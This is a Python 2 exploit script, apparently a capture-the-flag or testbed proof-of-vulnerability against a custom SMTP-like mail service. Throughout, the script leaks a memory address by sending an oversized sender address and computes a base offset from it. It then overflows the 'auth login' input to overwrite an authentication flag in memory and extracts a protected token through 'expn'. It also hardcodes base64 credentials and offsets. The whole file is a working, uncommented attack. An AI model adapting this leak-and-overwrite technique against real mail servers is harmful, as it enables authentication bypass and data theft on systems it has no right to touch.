import socket
import os
import sys
import struct
import base64
import telnetlib

### These values are taken from the version without the testbed
### From offset: 0x9791
## authd: 0x20b244

def ru(s, u):
    z = ''
    while z.endswith(u) == False:
        a = s.recv(1)

        if a == '':
            print '[ERROR] Target must have crashed'
            s.close()
            sys.exit(1)

        z += a
    return z

def rl(s):
    return ru(s, '\n')

def get_leak(s):
    ## Make sure that the mailbox is clean
    ## echo -en "gtblfvji\x0029a4b1cbe00cd1a4fc707b79124fdc50" | base64
    s.send('auth plain Z3RibGZ2amkAMjlhNGIxY2JlMDBjZDFhNGZjNzA3Yjc5MTI0ZmRjNTA=\n')
    rl(s)

    s.send('dmail\n')
    rl(s)

    s.send('soml from:<aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com>\n')
    rl(s)
    s.send('rcpt to:<gtblfvji@dfyeeulk.com>\n')
    rl(s)
    s.send('data\n')
    rl(s)
    s.send('aaaaaaa\n')
    s.send('.\n')
    rl(s)
    s.send('rset\n')
    rl(s)

    ## echo -en "gtblfvji\x0029a4b1cbe00cd1a4fc707b79124fdc50" | base64
    s.send('auth plain Z3RibGZ2amkAMjlhNGIxY2JlMDBjZDFhNGZjNzA3Yjc5MTI0ZmRjNTA=\n')
    rl(s)

    s.send('rmail\n')
    y = ru(s, 'OK\n')

    z = y.find('.com')

    if z == -1:
        print "[ERROR] Failed to get leak"
        sys.exit(1)

    z += 4

    v = y[z:z+6] + '\x00\x00'

    d = struct.unpack('Q', v)[0]

    print 'ADDRESS=%.16x' %(d)

    return d

def overwrite_auth(s, addr):
    d = 'a'*32
    y = struct.pack('Q', addr)

    d += y

    s.send('auth login\n')
    rl(s)

    u = base64.b64encode(d)
    s.send( u + '\n')
    rl(s)
    s.send( u + '\n')
    rl(s)

    s.send('helo a.a.a\n')
    rl(s)

def main( argv ):
    if len(argv) == 3:
        HOST=argv[1]
        PORT=int(argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print '[ERROR] target and port must be specified via arguments or variables.'
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print '[FAIL] Failed to connect to target %s:%d' %(HOST, PORT)
        sys.exit(1)

    rl(s)
    s.send('helo a.a.a\n')
    rl(s)

    print '[INFO] Connected to %s:%d' %(HOST, PORT)

    try:
        addr = get_leak(s)
    except:
        print '[FAIL] Exception when trying to leak address'
        s.close()
        sys.exit(1)

    base = addr - 0x9791
    authd = base + 0x20b244

    try:
        overwrite_auth( s, authd )
    except:
        print '[FAIL] Exception when attempting to overwrite the authd location'
        s.close()
        sys.exit(1)

    print '[INFO] Send the overwrite'

    s.send('expn one\n')
    y = rl(s)

    if y.find('250') == -1:
        print '[FAIL] The overwrite must have failed'
        s.close()
        sys.exit(1)

    y += ru( s, '250 Done\n')

    print 'TOKEN=%s' %(y)

    s.send('quit\n')
    rl(s)
    s.close()

    print '[SUCCESS] Successfully leaked the data'
if __name__ == '__main__':
    main(sys.argv)
